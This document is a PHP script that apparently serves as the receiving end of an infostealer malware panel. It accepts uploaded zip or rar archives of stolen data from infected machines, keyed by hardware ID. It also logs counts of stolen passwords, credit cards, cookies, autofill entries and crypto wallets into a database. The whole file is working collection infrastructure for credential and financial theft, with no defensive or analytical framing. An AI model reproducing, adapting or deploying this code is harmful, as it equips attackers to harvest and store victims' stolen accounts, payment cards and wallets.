<?php
//error_reporting(0);
include("config.php");

function safe_id($data){

  $data =  trim($data);
  $data =  strip_tags($data);
  $data =  htmlspecialchars($data);
  $data =  addslashes($data);
  
  return $data;
}




$hwid = $_GET['hwid'];
$Passwords = intval($_GET['Passwords']);
$CreditCards = intval($_GET['CreditCards']);
$Cookies = intval($_GET['Cookies']);
$AutoFill = intval($_GET['AutoFill']);
$Wallets = intval($_GET['Wallets']);



if(isset($hwid)) {
    
    if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
						
      //  exit();
         
      }else{
        //$pwd = "C:/xampp/htdocs/gom_v4/upload/";
        $pwd = getcwd() . "/upload/";
        //echo  $pwd;

		
        $allowed_extensions = array("zip","rar","ZIP","RAR","TXt");
        $temp = explode(".", $_FILES["file"]["name"]);
        $file_extension = end($temp);
        
        if (in_array($file_extension, $allowed_extensions)) 
        {

            $destination = "upload/" . basename($_FILES['file']['name']);
            move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
             //$d = date('Y/m/d h:i:s a', time());
            $q_check = "SELECT * FROM `logs` WHERE `hwid`='$hwid'";
            $query_check = mysqli_query($condb,$q_check);
            $count_check = mysqli_num_rows($query_check);
            if ($count_check < 1){

              mysqli_query($condb,"INSERT INTO `logs`(`hwid`, `Passwords`, `CreditCards`, `Cookies`, `AutoFill`, `Wallets`, `File_log`) VALUES ('$hwid' , '$Passwords' , '$CreditCards' , '$Cookies' ,'$AutoFill' , '$Wallets' , '$destination')");
            
            }



        }
                                
          //echo  "allowed :)";
       

  }
    


}
					
	
							
							
?>